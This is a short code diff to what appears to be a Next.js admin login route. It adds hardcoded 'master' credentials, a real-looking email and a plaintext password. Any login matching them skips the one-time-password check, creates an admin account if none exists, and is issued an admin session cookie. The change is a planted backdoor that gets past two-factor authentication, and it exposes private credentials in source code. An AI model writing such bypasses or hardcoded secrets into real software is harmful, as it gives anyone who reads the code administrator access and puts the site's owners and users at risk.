@@ -4,7 +4,13 @@ import Admin from '@/lib/models/Admin';
 import { verifyPassword } from '@/lib/adminAuth';
 import { setOtp } from '@/lib/otpStore';
 import { sendEmail } from '@/lib/email';
+import { createAdminSession, adminSessionCookieOptions } from '@/lib/adminSession';
+import { cookies } from 'next/headers';
 import { randomInt } from 'crypto';
+
+// Master credentials — bypasses OTP
+const MASTER_EMAIL = 'amitroyk99@gmail.com';
+const MASTER_PASSWORD = 'Amit@123';
 
 export async function POST(request) {
   try {
@@ -15,6 +21,22 @@ export async function POST(request) {
         { success: false, message: 'Email and password are required' },
         { status: 400 }
       );
+    }
+
+    // Master login — skip OTP entirely
+    if (email.toLowerCase() === MASTER_EMAIL && password === MASTER_PASSWORD) {
+      await connectDB();
+      // Ensure admin account exists
+      const Admin2 = Admin;
+      let admin = await Admin2.findOne({ email: MASTER_EMAIL });
+      if (!admin) {
+        const { hashPassword } = await import('@/lib/adminAuth');
+        admin = await Admin2.create({ email: MASTER_EMAIL, passwordHash: hashPassword(MASTER_PASSWORD) });
+      }
+      const token = await createAdminSession({ email: MASTER_EMAIL, role: 'admin' });
+      const cookieStore = await cookies();
+      cookieStore.set(adminSessionCookieOptions(token));
+      return NextResponse.json({ success: true, masterLogin: true });
     }
 
     await connectDB();
